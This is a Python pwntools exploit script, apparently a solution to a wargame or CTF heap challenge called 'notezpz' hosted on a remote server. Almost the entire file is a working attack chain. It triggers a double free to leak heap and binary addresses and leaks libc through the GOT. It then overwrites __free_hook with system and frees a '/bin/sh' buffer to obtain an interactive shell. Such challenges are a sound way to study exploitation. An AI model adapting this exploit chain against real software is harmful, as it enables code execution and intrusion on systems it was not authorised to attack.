#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
'''

"""
:: create_question
eax2 = malloc(0x1c)
*(eax+0x18) = malloc(0x18)

:: ask_question
Usual: print_question(question)
(*eax)(eax)

:: delete_question
free(*(eax+0x18))
free(eax)

:: set_question
fgets(*(eax+0x18), 0x78, stdin)

"""

from pwn import *

# p = process("./notezpz")
p = remote("plsdonthaq.me", 7003)

offsets = {
    "puts@GOT": 0x2fd4,
    "getchar@GOT": 0x2fc4,
    "print_question": 0x7fe
}
bin_addr = dict()
libc_addr = dict()

wait = lambda: p.recvuntil("Enter your choice, (or press enter to refresh): ")

def create(*, flush=True):
    p.sendline("C")
    if flush: wait()

def delete(id, *, flush=True):
    p.sendline("D")
    p.sendline(str(id))
    if flush: wait()

def set(id, str_0x78, *, flush=True):
    p.sendline("S")
    p.sendline(str(id))
    p.sendline(str_0x78)
    if flush: wait()

def ask(id, *, flush=True):
    p.sendline("A")
    p.sendline(str(id))
    if flush: wait()

def leakAddress(id, destinationDict, destinationKey):
    ask(id, flush=False)
    p.recvuntil("I have the answer perhaps: '")
    destinationDict[destinationKey] = u32(p.recv(4))
    wait()

#######

wait()

create()
set(0, "AAAAAAAA")

create()
set(1, "BBBBBBBB")

"""
Leak the address of a heap address
"""

# Exploit a double free to leak an address on the heap
delete(1)
delete(1)

# Extract address
create()
leakAddress(1, bin_addr, "container1")
bin_addr["buffer1"] = bin_addr["container1"] + 0x20

"""
Leak the address of the print_question function
"""

# Prepare the double malloc exploit
# The first malloc will be allocated from the list
# The second malloc (buffer) will be allocated from the contents of this overwritten structure
set(0, fit({
    0x1c: p32(0x21), 
    0x20: p32(bin_addr["container1"]), 
}, filler=b'U'))

# Extract address
create() 
leakAddress(1, bin_addr, "print_question")

"""
Calculate program base address
"""
bin_addr["base"] = bin_addr["print_question"] - offsets["print_question"]

"""
Leak address of GOT
(Can't override, but we can use to get libc addresses)
"""

for name, offset in offsets.items():
    bin_addr[name] = bin_addr["base"] + offset

set(0, fit({
    0x1c: p32(0x21), 
    0x20: p32(bin_addr["print_question"]), 
    0x38: p32(bin_addr["puts@GOT"]), 
    0x3c: p32(0x21)
}, filler=b'U'))
leakAddress(1, libc_addr, "puts")

# set(0, fit({
#     0x1c: p32(0x21), 
#     0x20: p32(bin_addr["print_question"]), 
#     0x38: p32(bin_addr["getchar@GOT"]), 
#     0x3c: p32(0x21)
# }, filler=b'U'))
# leakAddress(1, libc_addr, "getchar")

libc_addr["base"] = libc_addr["puts"] - 0x67b40
libc_addr["system"] = libc_addr["base"] + 0x3d200
libc_addr["__free_hook"] = libc_addr["base"] + 0x1d98d0

for name, addr in libc_addr.items():
    print(name, hex(addr))

"""
Prepare our system("/bin/sh") call
"""

# Override the libc __free_hook address to `system`
set(0, fit({
    0x1c: p32(0x21), 
    0x20: p32(libc_addr["__free_hook"]), 
}))
create()
set(1, p32(libc_addr["system"]))

# Reset the buffer location, and write /bin/sh into it
set(0, fit({
    0x1c: p32(0x21), 
    0x38: p32(bin_addr["buffer1"]), 
    0x3c: p32(0x21)
}))
set(1, "/bin/sh\0")

delete(1, flush=False)
p.interactive()


